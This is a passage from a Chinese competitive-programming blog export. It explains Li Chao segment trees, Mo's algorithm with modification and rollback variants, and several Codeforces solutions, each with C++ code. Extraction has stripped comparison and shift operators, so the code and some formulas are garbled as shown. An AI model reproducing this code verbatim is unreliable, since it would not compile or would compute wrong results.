r) 1; if (x = k) return query (l,mid,tree[dx].l,tree[dy].l,k); // 左子树能包含第 k 小 else return query (mid + 1,r,tree[dx].r,tree[dy].r,k - x); 李超线段树P4097 [HEOI2013]Segment 支持区间加入一条平面上的线段，单点询问函数最值，用一次函数的形式储存线段。 有两种操作： 加入一个值域为 $[l,r]$ 的一次函数 给定 $k$ 后求与 $x = k$ 相交时 $y$ 最大的线段编号（相同时按照字典序） 拿新线段在中点处的值与原最优线段在中点处的值作比较，择优选取。主要可以分为以下几种情况： 之前没有线段，则新线段为最优解。 新线段完全优于原线段，直接更新整段。 新线段完全劣于原线段，直接忽略。 新线段与原线段有交点，继续进行分类讨论，两种情况继续对应更新左右子区间的两种情形： 交点在中点中间及左侧 交点在中点右侧 在写法上大致与普通线段树相同，但是有几个细节需要注意一下： 对于一条线段，如果直接用点斜式表示，斜率可能不存在（但由题知不会为 $0$），所以可以特判此情况将其标记为 $0$。 输入时需要调整两端点的位置，确保 $x_0 x_1$ 从而方便计算。 在更新最优子区间时相当于标记下放，在此因减少分类讨论量默认为当前最优子区间的中点小于新加入的线段，若不符合强制交换一下，然后在此基础上更新左区间或右区间。 若不存在任何一条线段与查询直线有交，则输出 $0$；若有多条线段与查询直线的交点纵坐标都是最大的，则输出编号最小的线段。以上为输出的要求，对于不相交的线段，特判一下即可；而对于输出答案的方式，写一个函数进行比较，纵坐标相同时比较编号，否则比较纵坐标即可。 代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD1 = 39989,MOD2 = 1e9 + 1;inline int read ();struct line double num; int id;;struct node double k,b; a[MAX];int t,ans,cnt,root[MAX 2];line cmp (line x,line y);double calc (int cur,int x);void add (int sx,int sy,int fx,int fy);void modify (int cur,int l,int r,int x,int y,int id);void pushdown (int cur,int l,int r,int id);line query (int cur,int l,int r,int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) bool ty = read (); if (!ty) int k = read (); ans = query (1,1,MOD1,(ans + k - 1) % + MOD1 + 1).id; printf (%d ,ans); else int sx = read (),sy = read (),fx = read (),fy = read (); sx = (ans + sx - 1) % MOD1 + 1;fx = (ans + fx - 1) % MOD1 + 1; sy = (ans + sy - 1) % MOD2 + 1;fy = (ans + fy - 1) % MOD2 + 1; if (sx fx) swap (sx,fx),swap (sy,fy); add (sx,sy,fx,fy); modify (1,1,MOD1,sx,fx,cnt); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;line cmp (line x,line y) if (x.num != y.num) return x.num y.num ? y : x; else return x.id y.id ? x : y;double calc (int cur,int x) return a[cur].k * x + a[cur].b;void add (int sx,int sy,int fx,int fy)// 已经保证 sx fx ++cnt; if (sx == fx) a[cnt] = 0,max (sy,fy);// 垂直与 x 轴时斜率不存在 else a[cnt].k = (double)(fy - sy) / (fx - sx); a[cnt].b = sy - a[cnt].k * sx; void modify (int cur,int l,int r,int x,int y,int id) if (x = l y = r) pushdown (cur,l,r,id); return ; int mid = (l + r) 1; if (x = mid) modify (cur 1,l,mid,x,y,id); if (y mid) modify (cur 1 | 1,mid + 1,r,x,y,id); void pushdown (int cur,int l,int r,int id)// 更新最优的区间 int mid = (l + r) 1; if (calc (root[cur],mid) calc (id,mid)) swap (root[cur],id); if (calc (root[cur],l) calc (id,l)) pushdown (cur 1,l,mid,id); if (calc (root[cur],r) calc (id,r)) pushdown (cur 1 | 1,mid + 1,r,id); line query (int cur,int l,int r,int x) if (x r || x l) return 0,0; line s = calc (root[cur],x),root[cur]; if (l == r) return s; int mid = (l + r) 1; if (x = mid) s = cmp (s,query (cur 1,l,mid,x)); else s = cmp (s,query (cur 1 | 1,mid + 1,r,x)); return s; 再来一道几乎属于是模板题的题目—P4254 [JSOI2008]Blue Mary开公司。 还是一样求 $x = k$ 时的最大值，不过还是有一些细节要注意： 虽然这是一个一次函数，但是由题目的数据范围可以看作一条 $[1,500000]$ 的线段。 第一天的收益为 $S$，之后每天增长 $P$，所以函数的斜率与截距分别为 $P$ 与 $S - P$。 询问的是函数的值而非编号，同时下取整至百位。 具体代码和上一个差不多，就不写出了。 莫队简单来说就是一类把 $[l,r]$ 的答案用 $O(1)$ 的算法扩展到 $[l,r - 1],[l,r + 1],[l - 1,r],[l + 1,r]$ 的数据结构。由于涉及到分块，所以时间复杂度为 $O(n\\sqrt{n})$。下面我们来简单证明一下莫队的时间复杂度。 首先考虑 $n,m$ 同阶的情况。令每一块 $l$ 的最大值分别为 $\\max_1,\\max_2,\\cdots,\\max_{\\lceil \\sqrt n \\rceil}$。每一个块的第一个询问暴力查找，时间复杂度为 $O(n)$。之后在极端情况下每个 $R$ 均为 $n$，$L$ 为 $\\max_i \\to \\max_{i - 1}$ 或 $\\max_{i - 1} \\to \\max_i$。$R$ 同块内由于已经有序，最多为 $O(n)$，全部为 $O(n\\sqrt n)$；$L$ 全部为 $O(\\sqrt n (\\max_i - \\max_{i - 1}))$，通过裂项求和已知为 $O(\\sqrt n (\\max_ {\\lceil n \\rceil - 1}))$，最坏情况下也就是 $O(n\\sqrt n)$。综上，莫队此时的时间复杂度为 $O(n\\sqrt n)$。 对于 $n,m$ 不同阶的情况，设块长度为 $S$，则复杂度为 $O(n \\times \\dfrac{n}{S} + mS)$，由基本不等式可知，当 $S = \\dfrac{n}{\\sqrt m}$ 时取到最小值，即 $O(n \\sqrt m)$。 莫队的模板如下（需要特别注意四个 while 循环的位置，前两步先扩大区间，即 --l 与 ++r，后两步再缩小区间，即 ++l 与 --r，从而保持 $l \\le r + 1$，使得区间保持合法）： void solve () sort (a + 1,a + 1 + m); for (int i = 1;i = m;++i) node q = a[i]; while (l q.l) move (--l,1); while (r q.r) move (r++,1); while (l q.l) move (l++,1); while (r q.r) move (--r,1); ans[q.id] = nw;//The function move updates nw 一道例题 P1494 [国家集训队] 小 Z 的袜子。 在排序之后，设 $f_i$ 表示颜色 $i$ 当前出现的次数，则更新答案时，扩大区间后答案为 $\\tbinom{f_k + 1}{2} - \\tbinom{f_k}{2}$，缩小区间为 $\\tbinom{f_k}{2} - \\tbinom{f_k - 1}{2}$。令答案为 $k$，则对于一个 $[l,r]$ 的询问，答案即为 $\\dfrac{k}{\\tbinom{l - r + 1}{2}}$。经过计算可以化简表达式， $\\tbinom{f_k + 1}{2} - \\tbinom{f_k}{2} = \\dfrac{(f_k + 1)f_k - f_k(f_k - 1)}{2} = \\dfrac{2f_k}{2} = f_k$。 因此我们通过莫队维护，时间复杂度为 $O(n\\sqrt{n})$。完整代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 5e4 + 5;const int MOD = 1e9 + 7;inline int read ();struct node int l,r,id; a[MAX];int n,m,s,x = 1,y,cnt[MAX],p[MAX]; ll sum,ansx[MAX],ansy[MAX];bool cmp (node x,node y);void add (int x);void del (int x);ll gcd (ll x,ll y);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (),m = read ();s = sqrt (n); for (int i = 1;i = n;++i) p[i] = read (); for (int i = 1;i = m;++i) a[i].l = read (),a[i].r = read (),a[i].id = i; sort (a + 1,a + 1 + m,cmp); for (int i = 1;i = m;++i) if (a[i].l == a[i].r) ansx[a[i].id] = 0,ansy[a[i].id] = 1; continue; while (x a[i].l) add (p[--x]); while (y a[i].r) add (p[++y]); while (x a[i].l) del (p[x++]); while (y a[i].r) del (p[y--]); ansx[a[i].id] = sum; ansy[a[i].id] = 1ll * (y - x + 1) * (y - x) 1; for (int i = 1;i = m;++i) if (!ansx[i]) ansy[i] = 1; else ll g = gcd (ansx[i],ansy[i]); ansx[i] /= g,ansy[i] /= g; printf (%lld/%lld ,ansx[i],ansy[i]); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;bool cmp (node x,node y) return (x.l / s == y.l / s) ? x.r y.r : x.l y.l;void add (int x) sum += cnt[x]++;void del (int x) sum -= --cnt[x];ll gcd (ll x,ll y) return (!y) ? x : gcd (y,x % y); 关于普通莫队，还有一个小小的优化。通过奇偶化排序，可以优化 $r$ 指针的移动次数，从而加快效率。因此上题的 cmp 函数可以修改如下： bool cmp (node x,node y) if (x.l / s != y.l / s) return x.l y.l; return (x.l / s) 1 ? x.r y.r : x.r y.r; 普通莫队不支持修改，但我们可以加入一个时间的信息来支持修改。时间这一维的加入让我们移动的方向由四种变为六种，同时排序的关键字也随之增加。 按照 $n^\\frac{2}{3}$ 的大小分成了 $n^{\\frac{1}{3}}$ 块，按照左右时间这一关键字顺序进行排序，之后的移动有两种情况： 左右端点所在块不变，时间向后移动，时间复杂度为 $O(n)$。 左右端点所在块改变，最快情况下，时间移动 $n$ 个单位，时间复杂度为 $O(n)$。 由于左右端点所在块各有 $n^{\\frac{1}{3}}$ 种，加上时间的复杂度，总共为 $O(n^{\\frac{1}{3} + \\frac{1}{3} + 1}) = O(n^{\\frac{5}{3}})$。 于是来看一下这一题，P1903 [国家集训队] 数颜色 / 维护队列 。 加入时间这个维度后，按照 $l,r,t$ 的顺序从小到大排序。现在唯一多的一个步骤就是处理时间这个维度。若当前将第 $p$ 个位置上的颜色 $x$ 改为 $y$，莫队当前区间为 $[l,r]$。有以下两种情况： 加入修改。若该位置在区间 $[l,r]$ 内，则将其删除后改为 $y$，否则直接加上新的颜色 $y$。 还原修改。转换一下，相当于将 $p$ 个位置由颜色 $y$ 改为 $x$。 写的时候两个操作用了两个结构体区别开。$Q$ 是存放询问的内容，里面的元素分别为询问编号，左端点，右端点，时间；$M$ 是修改，里面的元素分别为位置，旧颜色，新颜色。最后还要注意一下空间大小，具体代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();struct Q int id,l,r,t; q[MAX];struct M int p,pre,nw; a[MAX];int n,m,s,tot_q,tot_m,l = 1,r,Time,sum;int col[MAX],ans[MAX],pos[MAX],cnt[MAX * 10];bool cmp (Q x,Q y);void solve (int p,int x);void add (int x);void del (int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read ();s = (int) pow (n,2 / 3.0); for (int i = 1;i = n;++i) col[i] = read (),pos[i] = col[i]; for (int i = 1;i = m;++i) char ty;scanf (%c,ty); int x = read (),y = read (); if (ty == R) a[++tot_m] = (M)x,pos[x],y,pos[x] = y; else q[++tot_q] = (Q)tot_q,x,y,tot_m; sort (q + 1,q + 1 + tot_q,cmp); for (int i = 1;i = tot_q;++i) while (Time q[i].t) solve (a[Time + 1].p,a[Time + 1].nw),++Time; while (Time q[i].t) solve (a[Time].p,a[Time].pre),--Time; while (l q[i].l) add (col[--l]); while (r q[i].r) add (col[++r]); while (l q[i].l) del (col[l++]); while (r q[i].r) del (col[r--]); ans[q[i].id] = sum; for (int i = 1;i = tot_q;++i) printf (%d ,ans[i]); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;bool cmp (Q x,Q y) if (x.l / s != y.l / s) return x.l y.l; if (x.r / s != y.r / s) return x.r y.r; return x.t y.t;void solve (int p,int x) if (l = p p = r) add (x),del (col[p]); col[p] = x;void add (int x) ++cnt[x]; if (cnt[x] == 1) ++sum;void del (int x) if (cnt[x] == 1) --sum; --cnt[x]; 回滚莫队 在区间转移时，可能会出现删减操作无法实现的问题，而这时可以考虑是使用回滚莫队解决问题。 以这道例题 AT1219 JOISC 2014 Day1 历史研究 为例。该题的删除操作用普通莫队难以解决，由于询问离线，故可以考虑回滚莫队。 设块大小为 $s$，对于第 $i$ 的块有左右端点 $l_i,r_i$，莫队当前区间为 $[L,R]$。先对询问按之前的方式排序，然后根据不同情况分类讨论： 当前左端点对应的块的编号为 $x$，若与上一个询问的左端点所处编号为 $y$ 的块的左端点不同，那么有 $L = r_x + 1,R = r_x$。 询问的左右端点处于同一个块，则直接暴力循环求解。 询问的左右端点处于不同块，则有： 询问右端点大于 $R$：扩展莫队区间右端点。 同理扩展莫队区间左端点。 回答询问后撤销扩展莫队区间左端点，并将其回滚至 $r_x + 1$。现在来分析一下时间复杂度，块大小仍然是 $s$。还是分类讨论，对于一个询问： 若左右端点在同一个块内，则普通的块内查询即可，显然遍历的时间复杂度为 $O(s)$。 若不在同一个块内，基于排序的方式，固定左端点，同时右端点单调。那么移动右端点所需的时间复杂度为 $O(n)$，左端点最多移动 $s$ 次。 所以总复杂度为 $O(s \\times m + n \\times\\dfrac{n}{s})$，有基本不等式易知当 $s = \\dfrac{n}{\\sqrt{m}}$ 时最优，为 $O(n \\sqrt{m})$。 代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();struct query int l,r,id; qu[MAX];int n,q,tot,times,s;int a[MAX],b[MAX],cnt[MAX],dcnt[MAX],L[MAX],R[MAX],pos[MAX]; ll ans[MAX],sum;bool cmp (query xx,query yy);void add (int x,ll v);void del (int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();q = read (); for (int i = 1;i = n;++i) a[i] = read (),b[++times] = a[i]; for (int i = 1;i = q;++i) qu[i].l = read (),qu[i].r = read (),qu[i].id = i; s = n / sqrt (q);tot = ceil ((double)n / s); sort (b + 1,b + 1 + times); times = unique (b + 1,b + 1 + times) - b - 1; for (int i = 1;i = n;++i) a[i] = lower_bound (b + 1,b + 1 + times,a[i]) - b;//离散化 for (int i = 1;i = tot;++i)//初始化 L[i] = (i - 1) * s + 1; R[i] = min (n,i * s); for (int i = 1;i = tot;++i) for (int j = L[i];j = R[i];++j) pos[j] = i; sort (qu + 1,qu + 1 + q,cmp); int l = 1,r = 0,la; for (int i = 1;i = q;++i) if (pos[qu[i].l] == pos[qu[i].r])// 左右端点在同一块内 for (int j = qu[i].l;j = qu[i].r;++j) ++dcnt[a[j]]; for (int j = qu[i].l;j = qu[i].r;++j) ans[qu[i].id] = max (ans[qu[i].id],1ll * b[a[j]] * dcnt[a[j]]); for (int j = qu[i].l;j = qu[i].r;++j) --dcnt[a[j]]; continue; if (pos[qu[i].l] != la) //一个新块 初始化莫队区间 while (r R[pos[qu[i].l]]) del (a[r--]); while (l R[pos[qu[i].l]] + 1) del (a[l++]); l = R[pos[qu[i].l]] + 1; la = pos[qu[i].l];sum = 0; while (r qu[i].r) add (a[++r],sum); int nwl = l;ll nwsum = sum;//记录当前 l 从而进行回滚 while (l qu[i].l) add (a[--l],nwsum); ans[qu[i].id] = nwsum; while (l nwl) del (a[l++]);//回滚 l = nwl; for (int i = 1;i = q;++i) printf (%lld ,ans[i]); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;bool cmp (query xx,query yy) return (pos[xx.l] != pos[yy.l]) ? pos[xx.l] pos[yy.l] : xx.r yy.r;void add (int x,ll v) ++cnt[x];v = max (v,1ll * cnt[x] * b[x]);void del (int x) --cnt[x]; 再来一道P5906 【模板】回滚莫队不删除莫队。简要题意：求一段区间 $[l,r]$ 种相同数中下标的极值，多次询问并且离线。 还是一样，用普通的莫队易于扩展区间而不利于缩小区间，仍然考虑回滚莫队。记得记录最大最小值下标的也要回滚，同时变量不要冲突，多次覆盖。代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();struct Q int l,r,id; q[MAX];int n,m,times,s,tot,l = 1,r,la,sum;int a[MAX],b[MAX],L[MAX],R[MAX];int vis[MAX],pos[MAX],ans[MAX];int mx[MAX],mn[MAX],dmx[MAX],dmn[MAX],nmx[MAX],nmn[MAX];bool cmp (Q xx,Q yy);void add (int x,int v,bool ty);void del (int x,bool ty);int main () n = read (); for (int i = 1;i = n;++i) a[i] = read (),b[++times] = a[i]; m = read (); for (int i = 1;i = m;++i) q[i].l = read (),q[i].r = read (),q[i].id = i; sort (b + 1,b + 1 + times); times = unique (b + 1,b + 1 + times) - b - 1; for (int i = 1;i = n;++i) a[i] = lower_bound (b + 1,b + 1 + times,a[i]) - b; s = n / sqrt (m);tot = ceil ((double) n / s); for (int i = 1;i = tot;++i) L[i] = s * (i - 1) + 1; R[i] = min (n,s * i); for (int i = 1;i = tot;++i) for (int j = L[i];j = R[i];++j) pos[j] = i; sort (q + 1,q + 1 + m,cmp); for (int i = 1;i = times;++i) mn[i] = dmn[i] = INF; for (int i = 1;i = m;++i) if (pos[q[i].l] == pos[q[i].r]) for (int j = q[i].l;j = q[i].r;++j) nmx[a[j]] = 0,nmn[a[j]] = INF; for (int j = q[i].l;j = q[i].r;++j) nmx[a[j]] = max (nmx[a[j]],j),nmn[a[j]] = min (nmn[a[j]],j); for (int j = q[i].l;j = q[i].r;++j) ans[q[i].id] = max (ans[q[i].id],nmx[a[j]] - nmn[a[j]]); continue; if (pos[q[i].l] != la) while (r R[pos[q[i].l]]) del (r--,0); while (l R[pos[q[i].l]] + 1) del (l++,0); r = R[pos[q[i].l]];l = R[pos[q[i].l]] + 1; la = pos[q[i].l];sum = 0; while (r q[i].r) add (++r,sum,0); int nwsum = sum,nwl = l; while (nwl q[i].l) add (--nwl,nwsum,1); while (nwl l) del (nwl++,1); ans[q[i].id] = nwsum; for (int i = 1;i = m;++i) printf (%d ,ans[i]); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;bool cmp (Q xx,Q yy) return (pos[xx.l] != pos[yy.l]) ? xx.l yy.l : xx.r yy.r;void add (int x,int v,bool ty) if (!ty) mx[a[x]] = max (mx[a[x]],x);mn[a[x]] = min (mn[a[x]],x); v = max (v,mx[a[x]] - mn[a[x]]); else dmn[a[x]] = min (dmn[a[x]],min (mn[a[x]],x));dmx[a[x]] = max (dmx[a[x]],max (mx[a[x]],x)); v = max (v,dmx[a[x]] - dmn[a[x]]); void del (int x,bool ty) if (!ty) mx[a[x]] = 0,mn[a[x]] = INF; else dmx[a[x]] = 0,dmn[a[x]] = INF;","categories":["Algorithm"]},{"title":"题解：CF1701D Permutation Restoration","path":"/2022/07/12/CF1701D/","content":"$\\forall b_i = \\lfloor \\dfrac{i}{a_i} \\rfloor$，等价于 $a_ib_i \\le i a_i(b_i + 1)$，所以有 $\\dfrac{i}{b_i + 1} a_i \\le \\dfrac{i}{b_i}$。也就是说，每一个 $b_i$ 都会对应一段 $a_i$ 的区间。由于左端点是开区间无法取到 $\\dfrac{i}{b_i + 1}$，因此就是就比 $\\dfrac{i}{b_i + 1}$ 大的最小整数，也就是 i / (b[i] + 1) + 1；右端点是闭区间，求出不大于 $\\dfrac{i}{b_i + 1}$ 的最大整数，也就是 i / b[i]（当然，$b_i$ 为 $0$ 时显然应该是 $n$）。 便于处理，以左端点为关键字进行排序。考虑到随着 $i$ 的变化，每段区间的右端点都会被最先舍去。因此我们对于每一段区间，用贪心的思想取出每段中的右端点构成的集合中的最小的数作为答案。不难想到可以利用优先队列（小根堆）去维护最小值。由于数据经过了排序，所以还需要记录原来的编号，得到的最小值的编号便是原来 $a$ 数组的下标。 于是有了最终代码，加了一些注释便于理解： #include iostream#include cstdio#include algorithm#include cmath#include cstring#include queue#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 5e5 + 5;const int MOD = 1e9 + 7;inline int read ();int t,n,a[MAX],ans[MAX]; struct node int x,id; num[MAX];priority_queue pair int,int,vector pair int,int ,greater pair int,int q;bool cmp (node xx,node yy) return xx.x yy.x;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read (); for (int i = 1;i = n;++i) a[i] = read (); num[i] = i / (a[i] + 1) + 1,i;//最后加 +1 是因为开区间无法取到 sort (num + 1,num + 1 + n,cmp);//左端点排序 while (!q.empty ()) q.pop ();//多测的初始化不能忘记！！ int j = 1; for (int i = 1;i = n;++i) while (j = n num[j].x == i)//找到符合左端点为 i 的就加入到优先队列中 int k = num[j].id; if (!a[k]) q.push (n,k); else q.push (k / a[k],k); ++j; ans[q.top ().second] = i;//取最小的右端点的编号，进行答案的更新 q.pop (); for (int i = 1;i = n;++i) printf (%d ,ans[i]); puts (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF1702C Train and Queries","path":"/2022/07/12/CF1702C/","content":"若干个车站被停靠若干次，第 $i$ 次停靠的站点为 $j$，设 $\\forall j \\in n$，站点 $j$ 被停靠所对应的集合为 $ {C_i}$。则容易想到，对于每组询问的 $x,y$，若成立则一定满足 $\\min \\{C_x\\} \\max \\{C_y\\}$。 发现数据范围中 $u_i$ 较大，但是 $n$ 较小，考虑使用 map int,int p1,p2 来存储每个站点的最小，最大停靠编号。值得注意的是，因为 unodered_map 的不稳定性，不要去使用它，可能会导致超时。（好像很多人因为这个，赛后被 hack 疯了） 于是，在询问的时候，只要这两个站点被停靠过并且满足 $\\min \\{C_x\\} \\max \\{C_y\\}$，就输出 YES，否则为 NO。上代码： #include iostream#include cstdio#include algorithm#include cmath#include map #include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();int t,n,k,a[MAX];map int,int p1,p2;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read ();k = read (); p1.clear ();p2.clear ();//多测一定要记得清空！！！ for (int i = 1;i = n;++i) a[i] = read (); p1[a[i]] = (!p1[a[i]]) ? i : min (p1[a[i]],i); p2[a[i]] = (!p2[a[i]]) ? i : max (p2[a[i]],i);//一个存最大值，另一个存最小值 for (int i = 1;i = k;++i) int x = read (),y = read (); if (p1[x] != 0 p1[y] != 0 p1[x] p2[y]) printf (YES );//有解的两个情况都要符合 else printf (NO ); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF1702F Equate Multisets","path":"/2022/07/12/CF1702F/","content":"对于一个 $a_i$ 若可以表示成 $k \\times 2^p$ 的形式，那一定可以由 $k$ 进行若干次第一个乘 $2$ 的操作得到。所以我们将所有的 $a_i$ 预处理，使其变成奇数。然后使用 map int,int p 统计 $a_i$ 的分布，$p_i$ 的值就相当于处理 $b$ 后该数需要出现的次数。 对于每一个 $b_i$，若 $p_{b_i}$ 大于 $0$，那么就说明 $b_i$ 可以变成某个 $a_j$。因此将 $p_{b_i} - 1$ 以作更新；否则将 $b_i$ 除以 $2$ 后向下取整，直至为 $0$。最后只要更新的次数为 $n$，就说明每一个 $b_i$ 都能分别对应一个不同的 $a_j$，此时答案为 YES。 代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#include map#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();int t,n,cnt,a[MAX],b[MAX]; map int,int p;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read (); cnt = n; p.clear ();//多测要清空！！！ for (int i = 1;i = n;++i) a[i] = read (); while (a[i] % 2 == 0) a[i] /= 2;//处理 a_i ++p[a[i]];//存入 map 中 for (int i = 1;i = n;++i) int x = read (); while (x) if (p[x])//只要存在就更新 --p[x],--cnt; break; x /= 2;//不断除以 2 直到变为 0 if (!cnt) printf (YES );//处理了 n 次使得 cnt 变为 0 else printf (NO ); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF1687A The Enchanted Forest","path":"/2022/06/05/CF1687A/","content":"一开始以为是一个 $\\texttt{dp}$，仔细一看发现只是一个普通的贪心。 若 $k \\le n$，则不能收集完或恰好收集完所有的蘑菇。如果一个地方的蘑菇被重复地收取，则会浪费之前到达该地所花的时间。我们的目标是使得时间之和最大，故一个地方重复遍历不可取。尝试模拟后可以发现，对于新长出来的蘑菇，收集的数目是确定的，为 $\\sum_{i = 1}^{k - 1}$，运用高斯求和公式后得到 $\\dfrac{k \\times (k - 1)}{2}$。现在问题就转换为求原有蘑菇序列的长度为 $k$ 的区间和的最大值，因此只需要类似滑动窗口般的思想扫一遍求出最大值。 若 $k n$，则可以收集完原有的所有的蘑菇（由于每次只长一个蘑菇，初始位置的蘑菇数量大于等于 $1$，所以收集原有的所有蘑菇至少不比不全收劣），对于如何求出新长出的蘑菇的最值的序列的问题，我的方法是逆向考虑。由于收集完原有的所有的蘑菇，所以每个节点至少到一次，令最后一次所到达的节点为 $n$，倒数第二个到达的点为 $n - 1$，以此类推……那么可以发现，$n$ 点最后生长的一个蘑菇没用能够采集，$n - 1$ 点有两个，一次类推……所以说，在 $k$ 秒后，共新长出了 $n \\times k$ 个蘑菇，而节点 $n$ 至 $1$ 分别有 $1,2,\\cdots,n$ 个蘑菇未采集，即总共采集到的新长出的蘑菇数量为 $n \\times k - \\sum_{i = 1}^{n} = n \\times t - \\frac{(n + 1) \\times n}{2}$。 时间复杂度为 $O(n)$，可以通过本题。最后，千千万万注意开 $\\texttt{long long}$。代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();int t;ll k,n,ans,a[MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) ans = 0; n = read ();k = read (); for (int i = 1;i = n;++i) a[i] = read (); if (k = n) ll s = 0; for (int i = 1;i = n;++i) if (i = k) s += a[i],ans = s; else ans = max (ans,s - a[i - k] + a[i]),s = s - a[i - k] + a[i]; ans += k * (k - 1) 1; else for (int i = 1;i = n;++i) ans += a[i]; ans += n * k; ans -= n * (n + 1) 1; printf (%lld ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF1688A Cirno's Perfect Bitmasks Classroom","path":"/2022/06/05/CF1688A/","content":"首先暴力肯定是不行的，对于一个 $x=2^k$ 的数一定会被卡到超时。 由于题目寻找最小的数 $y$ 符合 $x \\ y 0$ 且 $x \\oplus y 0$，不难想到先用 $\\mathrm{lowbit}$ 找到符合 $x \\oplus y 0$ 的 $y$。发现只要 $x eq y$，显然也满足前者的条件。值得注意的是，当 $x = 1$ 时的答案比较特殊，因此特判即可。 因此，我们分为三类考虑，得到最终的代码： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int t,n,m;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read (); if (n == 1) printf (3 ); continue; m = n (-n); if (m == n) ++m; printf (%d ,m); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF1688B Patchouli's Magical Talisman","path":"/2022/06/05/CF1688B/","content":"对于一个奇数，不需要进行操作；对于一个偶数，只要有奇数存在，显然直接与奇数合并最优。因此，若序列中存在奇数，则由奇数+偶数=奇数的性质，可以将所有的偶数与其合并；若不存在奇数，则找到处理最少次数后能变为奇数的偶数，进行操作，然后将剩余的偶数与其合并。 代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();int t,n,mx,cnt,a[MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read ();cnt = 0;mx = INF; for (int i = 1;i = 